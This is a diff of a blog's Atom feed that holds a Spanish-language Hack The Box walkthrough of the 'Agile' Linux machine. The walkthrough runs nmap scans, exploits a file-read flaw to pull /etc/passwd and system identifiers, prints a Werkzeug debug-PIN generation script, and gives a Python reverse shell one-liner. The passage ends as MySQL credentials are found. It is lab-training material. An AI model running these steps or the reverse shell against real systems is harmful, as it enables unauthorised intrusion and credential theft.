@@ -1,4 +1,223 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-23T19:06:16-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Twomillion</title><link href="http://localhost:4000/HTB-TwoMillion/" rel="alternate" type="text/html" title="Htb Twomillion" /><published>2023-07-23T00:00:00-05:00</published><updated>2023-07-23T00:00:00-05:00</updated><id>http://localhost:4000/HTB-TwoMillion</id><content type="html" xml:base="http://localhost:4000/HTB-TwoMillion/">&lt;h2 id=&quot;begin&quot;&gt;Begin&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-04T19:15:02-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>HTB - Agile</title><link href="http://localhost:4000/HTB-Agile/" rel="alternate" type="text/html" title="HTB - Agile" /><published>2023-08-04T00:00:00-05:00</published><updated>2023-08-04T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Agile</id><content type="html" xml:base="http://localhost:4000/HTB-Agile/">&lt;h2 id=&quot;analisis&quot;&gt;Analisis:&lt;/h2&gt;
+
+&lt;p&gt;Esta machine es de dificultad &lt;strong&gt;Medium&lt;/strong&gt;, Sistema Operativo &lt;strong&gt;Linux&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;nota&quot;&gt;Nota:&lt;/h4&gt;
+
+&lt;p&gt;Hicieron una actualizacion que evita un &lt;strong&gt;“leak”&lt;/strong&gt; de los usuarios en una vulnerabilidad del codigo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reconocimiento&quot;&gt;Reconocimiento:&lt;/h3&gt;
+
+&lt;p&gt;Vamos a ver los &lt;strong&gt;puertos abiertos&lt;/strong&gt; del servidor, al igual que ver la version de las tecnologias que se usan detras:&lt;/p&gt;
+
+&lt;p&gt;Para hacer esto usaremos los comandos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &amp;lt;IP de la maquina&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;O si queremos ir mas rapido e ir de forma silenciosa:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP de la maquina&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Una vez obtenidos los puertos abiertos, usaremos herramientas de reconocimiento:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&amp;lt;Puertos&amp;gt; &amp;lt;IP de la Maquina&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez ejecutados los comandos, veremos los puertos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22, Perteneciente al servicio SSH, y vemos que es un servidor &lt;strong&gt;UBUNTU&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;80, Perteneciente al servicio HTTP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si tiramos un script de reconocimiento web a nivel de consola, podremos ver que se ejecuta un redirect a un dominio &lt;strong&gt;superpass.htb&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para, arreglar esto, vamos a tirar del virtual hosting, esto se hace agregando la ip y seguido, la redireccion al dominio correspondiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos un servicio que nos permite logearnos y registarse, asi que lo hacemos y veremos que se trata de un gestor de passwords:
+&lt;img src=&quot;/assets/img/HTB_Agile/A4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Registramos un usuario y vemos que se emplea un menu de gestion de passwords:&lt;/p&gt;
+
+&lt;p&gt;Como vemos, tenemos un boton de &lt;strong&gt;EXPORT&lt;/strong&gt;, este hace la accion de descargarnos un archivo &lt;strong&gt;.CSV&lt;/strong&gt;, por lo que interceptaremos la peticion con nuestra herramienta de confianza: &lt;strong&gt;burpsuite&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que existe una peticion de un archivo que se crea, para que luego te permita descargarlo:
+&lt;img src=&quot;/assets/img/HTB_Agile/A5.png&quot; alt=&quot;&quot; /&gt;
+Si interceptamos la peticion, podremos ver un parametro &lt;strong&gt;fn&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A6.png&quot; alt=&quot;&quot; /&gt;
+Podemos ver un &lt;strong&gt;LFI&lt;/strong&gt;:
+&lt;img src=&quot;/assets/img/HTB_Agile/A7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora bien, forzaremos un error para ver los mensajes que nos retorna el servidor:
+Si vemos bien, la aplicacion fuerza un &lt;strong&gt;debugger&lt;/strong&gt; y vemos que parece mostrar un parametro llamativo: &lt;strong&gt;cmd=resource&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A9.png&quot; alt=&quot;&quot; /&gt;
+Si vemos, este error permite activar el debugger… Y abrir una “terminal”” desde la pagina, pero nos pedira un &lt;strong&gt;PIN&lt;/strong&gt;, por lo que aqui entra una vulnerabilidad del modo debug.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Si vemos, se usa Python 3.10&lt;/li&gt;
+  &lt;li&gt;Emplea &lt;strong&gt;flask&lt;/strong&gt; y podemos ver la ruta de la &lt;strong&gt;app.py&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Vemos que tiene el modo &lt;strong&gt;debug&lt;/strong&gt; activo&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si quieres tener un poco mas detallado esto, te sugiero que entres al siguiente enlace:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug&quot;&gt;HackTricks&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;obteniendo-el-pin&quot;&gt;Obteniendo el PIN&lt;/h3&gt;
+
+&lt;p&gt;Para explotar esta vulnerabilidad, tendremos que asegurarnos de tener los siguientes datos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;El modo debug esta &lt;strong&gt;activo&lt;/strong&gt; (✓)&lt;/li&gt;
+  &lt;li&gt;Username: En este caso es &lt;strong&gt;www-data&lt;/strong&gt;, que obtenemos al apuntar al /etc/passwd (✓)&lt;/li&gt;
+  &lt;li&gt;“modname”, en este caso es &lt;strong&gt;flask.app&lt;/strong&gt; (✓)&lt;/li&gt;
+  &lt;li&gt;El nombre de la APP es: &lt;strong&gt;“wsgi_app”&lt;/strong&gt; (✓)&lt;/li&gt;
+  &lt;li&gt;“uuid.getnode”, Este tendremos que obtenerlo&lt;/li&gt;
+  &lt;li&gt;“machine.id()”, el ID de la maquina, tambien tendremos que obtenerlo&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;obteniendo-el-uuidgetnode&quot;&gt;Obteniendo el uuid.getnode&lt;/h4&gt;
+
+&lt;p&gt;Si leemos la documentacion de &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug&quot;&gt;HackTricks&lt;/a&gt;, nos indica que primero tendremos que obtener la interfaz de red, apuntando al binario del sistema &lt;strong&gt;/proc/net/arp&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez obtenida la interfaz de red: &lt;strong&gt;eth0&lt;/strong&gt;, vamos a apuntar a la direccion:
+&lt;strong&gt;sys/class/net/&amp;lt;device id&amp;gt;/address&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A11.png&quot; alt=&quot;&quot; /&gt;
+Por lo que nos quedaria transformar esa direccion &lt;strong&gt;hexagesimal&lt;/strong&gt; al sistema decimal, esto lo podemos hacer con Python:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Direccion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;obteniendo-el-machine-id&quot;&gt;Obteniendo el Machine ID:&lt;/h4&gt;
+
+&lt;p&gt;Para esto, apuntamos a la ruta: &lt;strong&gt;/proc/sys/kernel/random/boot_id&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;obteniendo-el-pin-1&quot;&gt;Obteniendo el Pin:&lt;/h3&gt;
+
+&lt;p&gt;Si nos guiamos del codigo brindado por la misma documentacion de HackTricks:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;probably_public_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'web3_user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# username&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'flask.app'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# modname&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'Flask'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# getattr(app, '__name__', getattr(app.__class__, '__name__'))&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'/usr/local/lib/python3.5/dist-packages/flask/app.py'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# getattr(mod, '__file__', None),&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;private_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'UUID'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# str(uuid.getnode()),  /sys/class/net/ens33/address&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'MACHINE ID'&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# get_machine_id(), /etc/machine-id&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;probably_public_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cookiesalt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#h.update(b'shittysalt')&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__wzd'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pinsalt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rjust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tendriamos que ejecutarlo con nuestros parametros y obtener el codigo &lt;strong&gt;PIN&lt;/strong&gt;, para habilitar la consola en el modo &lt;strong&gt;debug&lt;/strong&gt;, dentro de la pagina.&lt;/p&gt;
+
+&lt;p&gt;Procedemos a ver si podemos ejecutar comandos de forma remota y de paso a asegurar si podemos efectuar conexiones remotas:
+&lt;img src=&quot;/assets/img/HTB_Agile/A14.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos comprobar que si, vamos a tirarnos una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A16.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viendo conexiones, podemos toparnos con un servicio &lt;strong&gt;MySql&lt;/strong&gt;, asi que iremos a buscar archivos que nos interesen… Vemos que existe un directorio &lt;strong&gt;app&lt;/strong&gt; dentro de la raiz del sistema, donde encontraremos las credenciales para logearnos al servicio MySQL&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
